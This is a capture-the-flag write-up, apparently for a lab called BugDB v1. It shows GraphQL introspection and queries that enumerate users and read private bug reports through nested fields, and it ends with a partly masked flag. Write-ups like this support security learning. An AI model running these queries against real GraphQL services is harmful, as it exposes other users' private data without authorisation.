# BugDB v1

## when open click on **`graphiql`**

<img width="1916" height="572" alt="image" src="https://github.com/user-attachments/assets/a2cbd08a-a24e-41bc-87b2-9c0c70bede2e" />

## By inspecting the request in Burp Suite, I noticed that an introspection query was being sent, which returned the full GraphQL schema.

<img width="1496" height="599" alt="image" src="https://github.com/user-attachments/assets/4a3b0ad7-0f16-4366-aafa-e7b5cbd45cd2" />

## [https://nathanrandal.com/graphql-visualizer/](https://nathanrandal.com/graphql-visualizer/)

<img width="1891" height="490" alt="image" src="https://github.com/user-attachments/assets/da48a238-bd96-4d7b-9a74-d9bb92173de7" />

## first i sent query to see all users

```graphql
{ 
     allUsers(first: 100) { 
          edges { 
               node {
                     id 
                     username
                      
                     }
                }
           }      
}
```

## fount that there is two users:

- **`admin`** -> id: `Users:1`
- **`victim`** -> id: `Users:2`

## after that i sent query to see all bugs:

```graphql
{ 
     allBugs(first: 100) { 
          edges { 
               node {
                     id 
                     private 
                     reporterId
                     reporter {
                          username 
                         }
                     }
                }
           } 
     
}
```

## and found that private is true on **`victim`** 

<img width="721" height="407" alt="image" src="https://github.com/user-attachments/assets/4bb9c7c5-7893-46cf-be6a-c377aa1229bc" />

## now will try to find content of **`Bugs_`** Table 

<img width="1894" height="484" alt="image" src="https://github.com/user-attachments/assets/5c0b23f9-0b81-4d0c-8082-2858f8177f84" />

```graphql
{ 
     allUsers(first: 100) { 
          edges { 
               node {
                   id
                   username
                   bugs(first: 100){
                         edges {
                              node {
                                   id
                                   reporterId
                                   text
                                   private
                                   }
                              }
                         } 
                     }
                }
           }      
}
```

## Boom found the flag 

<img width="1588" height="554" alt="image" src="https://github.com/user-attachments/assets/49db29e5-7a26-4984-b23a-1cd2752a196b" />

```
^FLAG^d585cc2f318e0fdb7b60******************a6c617ec8afde762d3c9c4eeaa$FLAG$
```

